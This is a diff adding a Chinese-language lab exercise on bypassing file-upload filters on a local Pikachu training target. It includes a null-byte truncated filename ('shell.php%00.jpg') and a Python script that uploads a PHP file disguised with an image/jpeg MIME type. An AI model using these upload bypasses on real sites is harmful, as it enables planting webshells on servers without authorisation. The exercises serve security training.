@@ -1,0 +1,44 @@
+## 一、核心目标
+1.  实现双写后缀过滤检测函数，理解黑名单单次过滤缺陷
+2.  构造带00截断字符的上传请求，掌握截断绕过的请求构造逻辑
+3.  编写MIME类型欺骗绕过检测脚本，验证文件上传进阶绕过的有效性
+
+---
+
+## 二、代码实现与逐行解析
+
+### 习题1 基础：双写后缀过滤检测函数
+def check_double_suffix(filename):
+    if "phpphp" in filename:
+        return "存在双写绕过风险"
+    else:
+        return "文件后缀名正常"
+name1="shell.phpphp"
+print(check_double_suffix(name1))
+
+### 习题2 实操：文件名00截断请求构造
+# 基础上传接口地址
+base_url = "http://127.0.0.1/pikachu/upload.php"
+# 构造00截断文件名：shell.php%00.jpg
+file_name = "shell.php%00.jpg"
+# 拼接完整请求链接
+full_url = base_url + "?filename=" + file_name
+# 输出构造好的截断链接
+print("00截断构造链接：", full_url)
+
+### 习题3 MIME类型欺骗上传
+import requests
+
+# 靶场地址（根据你的环境修改）
+upload_url = "http://127.0.0.1:9999/pikachu/vul/unsafeupload/servercheck.php"
+
+# 准备一句话木马
+shell_content = b"<?php phpinfo();?>"
+
+# 关键：修改Content-Type为image/jpeg，伪装成JPEG图片
+files = {"uploadfile": ("shell.php", shell_content, "image/jpeg")}
+data = {"submit": "开始上传"}
+
+resp = requests.post(upload_url, files=files, data=data)
+print("上传结果:", "成功" if "上传成功" in resp.text else "失败")
+print("返回路径:", resp.text[:150])
